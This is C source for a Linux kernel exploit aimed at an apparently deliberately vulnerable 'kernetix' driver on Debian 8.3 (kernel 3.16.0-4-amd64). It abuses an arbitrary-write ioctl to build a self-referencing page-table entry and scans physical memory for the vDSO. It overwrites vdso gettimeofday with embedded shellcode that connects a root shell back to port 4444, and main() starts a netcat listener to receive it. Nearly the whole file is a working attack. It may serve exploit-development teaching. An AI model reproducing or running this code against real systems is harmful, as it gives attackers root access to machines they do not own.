#include "kernetix.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>		
#include <unistd.h>		
#include <sys/ioctl.h>
#include <sys/utsname.h>


#define ELF_HEADER 0x010102464c457fL	
#define VDSO_OFFSET_SIGNATURE 0x280


static unsigned long PML4_ENTRY;
static unsigned long PDPT_PHYS_ADDR;
static unsigned int OFFSET_SELF_REF;
static unsigned int OFFSET_SPURIOUS_PTE;
static unsigned int VDSO_gettimeofday;


// https://gist.github.com/itsZN/1ab36391d1849f15b785
char shellcode[] = "\x90\x53\x48\x31\xC0\xB0\x66\x0F\x05\x48\x31\xDB\x48\x39\xC3"
				  "\x75\x0F\x48\x31\xC0\xB0\x39\x0F\x05\x48\x31\xDB\x48\x39\xD8"
				  "\x74\x09\x5B\x48\x31\xC0\xB0\x60\x0F\x05\xC3\x48\x31\xD2\x6A"
				  "\x01\x5E\x6A\x02\x5F\x6A\x29\x58\x0F\x05\x48\x97\x50\x48\xB9"
				  "\xFD\xFF\xEE\xA3\x80\xFF\xFF\xFE\x48\xF7\xD1\x51\x48\x89\xE6"
				  "\x6A\x10\x5A\x6A\x2A\x58\x0F\x05\x48\x31\xDB\x48\x39\xD8\x74"
				  "\x07\x48\x31\xC0\xB0\xE7\x0F\x05\x90\x6A\x03\x5E\x6A\x21\x58"
				  "\x48\xFF\xCE\x0F\x05\x75\xF6\x48\x31\xC0\x50\x48\xBB\xD0\x9D"
				  "\x96\x91\xD0\x8C\x97\xFF\x48\xF7\xD3\x53\x48\x89\xE7\x50\x57"
				  "\x48\x89\xE6\x48\x31\xD2\xB0\x3B\x0F\x05\x48\x31\xC0\xB0\xE7"
				  "\x0F\x05";

void create_self_reference(void)
{
  int fd;  
  char device_name[256];
  struct _kernel_write *kwrite = NULL;
  
  memset(device_name, 0x00, sizeof(device_name));
  sprintf(device_name, "/dev/%s0", KERNETIX_DEVICE_NAME);
  
  fd = open(device_name, 0);
  if (fd < 0) 
  {
    printf("Can't open device file: %s\n", device_name);
    exit(-1);
  }
  
  kwrite = (struct _kernel_write *)malloc(sizeof(kwrite));
  memset(kwrite, 0x00, sizeof(struct _kernel_write));
  
  //0xffff8800XXXXX880 67 40 fd 01 00 00 00 00
  //kwrite->address = (void *) (0xffff880001fd4000 + OFFSET_SELF_REF);
  //kwrite->value = (void *) 0x0000000001fd4067;
  kwrite->address = (void *)((0xFFFF000000000000 + (PML4_ENTRY<<39) + (PDPT_PHYS_ADDR<<12)) + OFFSET_SELF_REF);
  kwrite->value = (void *) ((PDPT_PHYS_ADDR<<12) + 0x67);
  
  if (!ioctl(fd, KERNETIX_ABW, kwrite))
  {		
    printf("Yay.. we're writing!...\n");
    printf("The old value was: %p\n", (int *)kwrite->old_value);  
    //printf("Value of myvar: %d\n", myvar);
  }
  
  free(kwrite);
  close(fd);
}

unsigned long calculate_autoref_address(void)
{  
  unsigned long entry = (OFFSET_SELF_REF/8);
  unsigned int pte_offset = ((OFFSET_SELF_REF/8) - 1) * 0xFFF; //Zero based
  pte_offset = pte_offset & 0xF000;
  unsigned long address = 0xFFFF000000000000 + (PML4_ENTRY<<39) + (entry<<30) + (entry<<21) + (entry<<12) + pte_offset;  
  return address;
}

unsigned long calculate_spurious_address(void)
{  
  unsigned long entry = (OFFSET_SELF_REF/8);
  unsigned int pte_offset = ((OFFSET_SPURIOUS_PTE/8) - 1) * 0xFFF; //Zero based
  pte_offset = pte_offset & 0xF000;  
  unsigned long address = 0xFFFF000000000000 + (PML4_ENTRY<<39) + (entry<<30) + (entry<<21) + (entry<<12) + pte_offset; 
  return address;
}

unsigned int search_vdso(unsigned long autoref_address, unsigned long spurious_address) 
{
  unsigned int pfn = 0;  	
  unsigned long sporious_pte;
  unsigned long pte_base = 0x0000000000000067;  
  
  for (pfn = 0; pfn < 0x40000; pfn++) // 1GB of page frames
  {	
    sporious_pte = pte_base + (pfn<<12);  			
	*(void **)(autoref_address + OFFSET_SPURIOUS_PTE) = (void *)sporious_pte;
	
    usleep(1); //TLB Flush

	if (*(unsigned long *)spurious_address == ELF_HEADER)
	{	
	  //if (*(unsigned long *)(spurious_address + VDSO_OFFSET_SIGNATURE) == VDSO_CLOCK_GE)
	  if (memcmp((void *)(spurious_address + VDSO_OFFSET_SIGNATURE), "vdso_gettimeofday\x00", 18) == 0)
	  {	 
		//printf("PFN: %i\n", pfn);
		//printf("%p \n", *(void **)0xFFFF880040202000);
		//printf("%p \n", (void *) ELF_HEADER);	
		//break;
		return pfn;
	  }	
	}
  } 
  return 0;  
}

int check_kernel_version(void)
{
  int ret = 0;
  struct utsname *buf = (struct utsname *)calloc(1, sizeof(struct utsname));  
  uname(buf);
  
  if ( (strcmp(buf->release, "3.16.0-4-amd64") == 0) && strstr(buf->version, "Debian") )
  {
	// Values for Debian 8.3 x64
	
	PML4_ENTRY = 0x110L;
    PDPT_PHYS_ADDR = 0x01af4L;
    OFFSET_SELF_REF = 0x10;
    OFFSET_SPURIOUS_PTE = 0x18;
    VDSO_gettimeofday = 0xED1;
    ret = 1;    
  }
  
  printf("Kernel release: %s\n", buf->release);
  printf("OS Version: %s\n", buf->version);
  return ret;
}

int main(void)
{ 
  unsigned int vdso_pfn = 0;   
  unsigned long autoref_address;
  unsigned long spurious_address;
  
  if ( !check_kernel_version() )
  {
	printf("Not supported\n");
	exit(-1);
  }
  
  autoref_address = calculate_autoref_address();
  spurious_address = calculate_spurious_address();
  
  printf("Autoref Address: %p\n", (void *)autoref_address );
  printf("Spurious Address: %p\n", (void *)spurious_address );
  
  // 0000000000000000 100010000 000000001 000000001 000000001 000000000000
  create_self_reference(); 
  
  
  vdso_pfn = search_vdso(autoref_address, spurious_address);
  
  printf("VDSO pfn: %i\n", vdso_pfn);
  
  memcpy((void *)(spurious_address + VDSO_gettimeofday), shellcode, strlen(shellcode));

  system("nc -nvlp 4444");  
  
  return 0;
}
